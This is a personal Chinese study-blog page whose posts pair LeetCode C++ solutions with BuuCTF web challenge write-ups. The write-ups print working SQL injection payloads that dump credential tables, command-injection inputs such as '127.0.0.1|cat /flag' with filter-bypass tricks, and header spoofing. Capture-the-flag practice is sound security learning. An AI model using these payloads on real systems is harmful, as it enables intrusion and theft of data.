<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>qinyiwen</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="qinyiwen">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="qinyiwen">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="qinyiwen" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<meta name="generator" content="Hexo 6.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">qinyiwen</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-20240215" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/02/15/20240215/" class="article-date">
  <time class="dt-published" datetime="2024-02-15T10:44:30.000Z" itemprop="datePublished">2024-02-15</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/02/15/20240215/">20240215</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h4 id="LeetCode"><a href="#LeetCode" class="headerlink" title="LeetCode"></a>LeetCode</h4><h5 id="加一"><a href="#加一" class="headerlink" title="加一"></a>加一</h5><p>当对数组 digits 加一时，只需要关注 digits 的末尾出现了多少个 999 即可。可以考虑如下的三种情况：</p>
<p>如果 digits 的末尾没有 999，例如 [1,2,3]，那么直接将末尾的数加一，得到 [1,2,4] 并返回；</p>
<p>如果 digits 的末尾有若干个 999，例如 [1,2,3,9,9]，那么只需要找出从末尾开始的第一个不为 999 的元素，即 333，将该元素加一，得到 [1,2,4,9,9]。随后将末尾的 999 全部置零，得到 [1,2,4,0,0] 并返回。</p>
<p>如果 digits 的所有元素都是 999，例如 [9,9,9,9,9]，那么答案为 [1,0,0,0,0,0]。只需要构造一个长度比 digits 多 111 的新数组，将首元素置为 111，其余元素置为 000 即可。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">plusOne</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; digits)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n=digits.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(digits[n<span class="number">-1</span>]!=<span class="number">9</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            digits[n<span class="number">-1</span>]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(digits[n<span class="number">-1</span>]==<span class="number">9</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(n==<span class="number">1</span>) </span><br><span class="line">            &#123;</span><br><span class="line">                digits[n<span class="number">-1</span>]=<span class="number">0</span>;</span><br><span class="line">                digits.<span class="built_in">insert</span>(digits.<span class="built_in">begin</span>(), <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                digits[n<span class="number">-1</span>]=<span class="number">0</span>;</span><br><span class="line">                <span class="keyword">for</span>(i=n<span class="number">-2</span>;i&gt;=<span class="number">0</span>;i--)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span>(digits[i]==<span class="number">9</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        digits[i]=<span class="number">0</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        digits[i]++;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(i==<span class="number">0</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        digits.<span class="built_in">insert</span>(digits.<span class="built_in">begin</span>(), <span class="number">1</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> digits;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h5 id="验证回文串"><a href="#验证回文串" class="headerlink" title="验证回文串"></a>验证回文串</h5><p>最简单的方法是对字符串 s 进行一次遍历，并将其中的字母和数字字符进行保留，放在另一个字符串中。这样只需要判断是否是一个普通的回文串即可。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isPalindrome</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n=s.<span class="built_in">length</span>();</span><br><span class="line">        <span class="type">int</span> i=<span class="number">0</span>,x=<span class="number">1</span>;</span><br><span class="line">        <span class="type">char</span> zm[n+<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>((<span class="string">&#x27;a&#x27;</span>&lt;=s[i] &amp;&amp; s[i]&lt;=<span class="string">&#x27;z&#x27;</span>) || (<span class="string">&#x27;A&#x27;</span>&lt;=s[i] &amp;&amp; s[i]&lt;=<span class="string">&#x27;Z&#x27;</span>) || (<span class="string">&#x27;0&#x27;</span>&lt;=s[i] &amp;&amp; s[i]&lt;=<span class="string">&#x27;9&#x27;</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                zm[x]=<span class="built_in">tolower</span>(s[i]);</span><br><span class="line">                x++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=x/<span class="number">2</span>;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(x==<span class="number">1</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(zm[i]!=zm[x-i])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h5 id="只出现一次的数字"><a href="#只出现一次的数字" class="headerlink" title="只出现一次的数字"></a>只出现一次的数字</h5><p>定义数组，数字n出现一次，v[n]加一，最终v[n]为1的话就说明n只出现了一次。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">singleNumber</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//30000个负数，30000个正数，1个0</span></span><br><span class="line">        <span class="type">int</span> n=nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">v</span><span class="params">(<span class="number">60010</span>,<span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            v[nums[i]+<span class="number">30000</span>]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">60010</span>;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(v[i]==<span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        i=i<span class="number">-30000</span>;</span><br><span class="line">        <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="BuuCTF"><a href="#BuuCTF" class="headerlink" title="BuuCTF"></a>BuuCTF</h4><h4 id="10、LoveSQL"><a href="#10、LoveSQL" class="headerlink" title="10、LoveSQL"></a>10、LoveSQL</h4><p>尝试万能密码</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/c41017b4-189d-4bb3-9734-cbe9b67f1176" alt="image"></p>
<p>有显示</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/28f501c1-3599-4279-b421-f10026b15978" alt="image"></p>
<p>尝试联合查询，查到3的时候回显正常</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/c732357b-32f9-4208-a8e8-1238c2ddc296" alt="image"></p>
<p>爆数据库password&#x3D;:<code>1&#39; union select 1,2,database()#</code></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/9e319507-1e47-4c7d-b1c3-513dfe8567dc" alt="image"></p>
<p>爆出数据库名为geek</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/9ee2e800-9f8e-4e3c-84cd-74cc042130f7" alt="image"></p>
<p>爆表名password&#x3D;<code>1&#39; union select 1,2,table_name from information_schema.tables where table_schema=database() limit 0,1#</code></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/46fefaef-3e5b-4e25-879b-fe8d90e6a190" alt="image"></p>
<p>爆出表名为geekuser</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/f86dda2c-490c-4565-9987-7debf9b563fc" alt="image"></p>
<p>爆表名password&#x3D;<code>1&#39; union select 1,2,table_name from information_schema.tables where table_schema=database() limit 1,1#</code></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/91e3ddbc-4172-46a3-bd4a-8475672d22ae" alt="image"></p>
<p>爆出表名为l0ve1ysq1</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/48fad51e-7c1d-46c2-a62f-70096f1911b0" alt="image"></p>
<p>爆列名password&#x3D;<code>1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;l0ve1ysq1&#39; #</code></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/d75cf913-a8ff-42bc-a889-2520f7034e8a" alt="image"></p>
<p>id,username,password</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/d4322e73-777f-41f7-a80d-216f16b92262" alt="image"></p>
<p>爆数据：<code>/check.php?username=1&amp;password=1&#39; union select 1,2,group_concat(id,username,password) from l0ve1ysq1%23</code></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/8f190d3d-18db-46dd-a153-14c2629ab419" alt="image"></p>
<p>查看源代码，得到flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/847ee93b-2338-46f3-bd64-75dd2af16945" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;7904eee7-45b3-4f8b-8eac-ecab975dac71&#125;</span><br></pre></td></tr></table></figure>

<h4 id="11、Http"><a href="#11、Http" class="headerlink" title="11、Http"></a>11、Http</h4><p>查看页面源代码，发现有个Secret.php文件</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/fc1e582e-da71-41e3-ae68-398440843c32" alt="image"></p>
<p>查看该文件，有一个网址</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/c8fae7de-4638-4717-894c-194b9ff5d21d" alt="image"></p>
<p>提示：It doesn’t come from ‘<a target="_blank" rel="noopener" href="https://www.sycsecret.com’,就是说这个页面得来自https//www.Sycsecret.com%EF%BC%8C%E6%B7%BB%E5%8A%A0referer%E5%8D%B3%E5%8F%AF">https://www.Sycsecret.com’，就是说这个页面得来自https://www.Sycsecret.com，添加referer即可</a></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer头用于告诉web服务器，用户是从哪个页面找过来的</span><br></pre></td></tr></table></figure>

<p>添加<code>Referer:https://www.Sycsecret.com</code>，send，提示Please use “Syclover” browser：请使用“Syclover”浏览器</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/06269527-d670-4189-8c9f-dc64374f0ec7" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent头用于告诉web服务器用户使用的浏览器和操作系统信息</span><br></pre></td></tr></table></figure>

<p>添加<code>User-Agent:Syclover</code>，send，提示No!!! you can only read this locally!!!：不! !您只能在本地阅读!!</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/b1b7a270-fb3d-4019-b4e7-6e174ce633a5" alt="image"></p>
<p>添加<code>X-Forwarded-For:127.0.0.1</code>，send，得到flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/d6d19f27-7902-4f41-b3d7-741661d1f670" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;43a4b431-f334-44b4-bcb3-aadf626871ac&#125;</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/02/15/20240215/" data-id="clsmsqz4000002ovf03iiaxsq" data-title="20240215" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/learn/" rel="tag">learn</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-20240214" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/02/14/20240214/" class="article-date">
  <time class="dt-published" datetime="2024-02-14T10:04:59.000Z" itemprop="datePublished">2024-02-14</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/02/14/20240214/">20240214</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h4 id="LeetCode"><a href="#LeetCode" class="headerlink" title="LeetCode"></a>LeetCode</h4><h5 id="两数之和"><a href="#两数之和" class="headerlink" title="两数之和"></a>两数之和</h5><p>使用暴力枚举，枚举数组中的每一个数 x，寻找数组中是否存在 target - x。</p>
<p>当我们使用遍历整个数组的方式寻找 target - x 时，需要注意到每一个位于 x 之前的元素都已经和 x 匹配过，因此不需要再进行匹配。而每一个元素不能被使用两次，所以我们只需要在 x 后面的元素中寻找 target - x。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">twoSum</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;</span><br><span class="line">        vector &lt;<span class="type">int</span>&gt; v;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;nums.<span class="built_in">size</span>()<span class="number">-1</span>;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(j=i+<span class="number">1</span>;j&lt;nums.<span class="built_in">size</span>();j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(nums[i]+nums[j]==target)</span><br><span class="line">                &#123;</span><br><span class="line">                    v = &#123;i,j&#125;;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> v;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h5 id="回文数"><a href="#回文数" class="headerlink" title="回文数"></a>回文数</h5><p>思路：</p>
<ul>
<li><p>将数字转换为字符串，并检查字符串是否为回文。但是，这需要额外的非常量空间来创建问题描述中所不允许的字符串。</p>
</li>
<li><p>将数字本身反转，然后将反转后的数字与原始数字进行比较，如果它们是相同的，那么这个数字就是回文</p>
</li>
</ul>
<p>我选择用循环，判断对称位的数是否相等</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isPalindrome</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(x&lt;<span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(x&gt;=<span class="number">0</span> &amp;&amp; x&lt;<span class="number">10</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">            <span class="type">int</span> n=<span class="built_in">ws</span>(x);</span><br><span class="line">            <span class="type">int</span> sz[n];</span><br><span class="line">            <span class="type">int</span> num=x;</span><br><span class="line">            <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">            &#123;</span><br><span class="line">                sz[i]=num%<span class="number">10</span>;</span><br><span class="line">                num=num/<span class="number">10</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n/<span class="number">2</span>;i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(sz[i]!=sz[n-i<span class="number">-1</span>]) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">ws</span><span class="params">(<span class="type">int</span> x)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="type">int</span> n=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(x!=<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            n++;</span><br><span class="line">            x=x/<span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> n;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h5 id="删除有序数组中的重复项"><a href="#删除有序数组中的重复项" class="headerlink" title="删除有序数组中的重复项"></a>删除有序数组中的重复项</h5><p>循环，删除重复项</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">removeDuplicates</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> len=nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span>(i=len<span class="number">-1</span>;i&gt;<span class="number">0</span>;i--)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i]==nums[i<span class="number">-1</span>])</span><br><span class="line">            &#123;</span><br><span class="line">                nums.<span class="built_in">erase</span>(nums.<span class="built_in">begin</span>()+i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> nums.<span class="built_in">size</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="BuuCTF"><a href="#BuuCTF" class="headerlink" title="BuuCTF"></a>BuuCTF</h4><h5 id="5、Exec"><a href="#5、Exec" class="headerlink" title="5、Exec"></a>5、Exec</h5><p>Linux ping 命令用于检测主机。执行 ping 指令会使用 ICMP 传输协议，发出要求回应的信息，若远端主机的网络功能没有问题，就会回应该信息，因而得知该主机运作正常</p>
<p>ls（英文全拼：list files）：用于显示指定工作目录下的内容（列出目前工作目录所含之文件及子目录)</p>
<p>cat（英文全拼：concatenate）：用于连接文件并打印到标准输出设备上</p>
<p>首先查看此文件的目录：127.0.0.1|ls</p>
<p>点击ping后发现有个index.php文件</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/9ed432b5-3a25-47e5-a5d8-fa4e3948b9ba" alt="image"></p>
<p>再查看上级目录：127.0.0.1|ls &#x2F;</p>
<p>点击ping后可以看到一个flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/0d1134f8-a13d-495a-aee7-8cf77a4b70df" alt="image"></p>
<p>查看flag：127.0.0.1|cat &#x2F;flag</p>
<p>得到flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/82ff4a13-d4da-43e8-bc7e-9b7cf5acf0f9" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;4504f6f2-191b-410b-b40d-18b4e403a271&#125;</span><br></pre></td></tr></table></figure>

<h5 id="6、Ping-Ping-Ping"><a href="#6、Ping-Ping-Ping" class="headerlink" title="6、Ping Ping Ping"></a>6、Ping Ping Ping</h5><p>这一题与上一题Exec类似，首先访问本地地址，发现有显示</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/22516845-102d-4d83-b285-1b77da5f6ece" alt="image"></p>
<p>查看此文件的目录，发现有两个文件</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/7d100ccc-5cf4-4e39-b61e-5cf2b2dc48f6" alt="image"></p>
<p>查看flag.php文件</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/4a1777df-77fb-4867-a0c5-6af4f22783c8" alt="image"></p>
<p>它说空格被过滤了</p>
<p>命令中空格被过滤的解决方法：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;cat,flag.txt&#125;</span><br><span class="line">cat$&#123;IFS&#125;flag.txt</span><br><span class="line">cat$IFS$9flag.txt: $IFS$9 $9指传过来的第9个参数</span><br><span class="line">cat&lt;flag.txt</span><br><span class="line">cat&lt;&gt;flag.txt</span><br><span class="line">kg=$&#x27;\x20flag.txt&#x27;&amp;&amp;cat$kg (\x20转换成字符串就是空格)</span><br></pre></td></tr></table></figure>

<p>发现符号又被过滤了，说明<code>&#123;&#125;</code>大括号被过滤了</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/edc798c1-1d33-40e5-ba2d-3044ba3e2d10" alt="image"></p>
<p>用另一个方法试下index.php文件</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/614c2964-8a82-41be-b50c-51b4d29bc50e" alt="image"></p>
<p>有一个参数a，<strong>变量拼接字符串——将a的值覆盖，然后进行绕过</strong></p>
<p>构造payload：<code>/?ip=127.0.0.1;a=g;cat$IFS$9fla$a.php</code></p>
<p>用变量拼接成flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/1db4f885-23d5-40b5-9d8a-291a10eae7f6" alt="image"></p>
<p>啥也没有，查看源代码，得到flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/8ea1b222-1b2e-420a-8a81-137e674b2caf" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;97aede41-9723-4901-8ac2-b345d66af44b&#125;</span><br></pre></td></tr></table></figure>

<h5 id="7、随便注"><a href="#7、随便注" class="headerlink" title="7、随便注"></a>7、随便注</h5><p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/1fe10469-06c6-4c22-87f0-1a3886b61577" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/0cd3e27d-e133-4673-bcc7-2d008ce22b09" alt="image"></p>
<p>查询3时没有显示，说明有两个字段</p>
<p>爆数据库：1’;show databases;#</p>
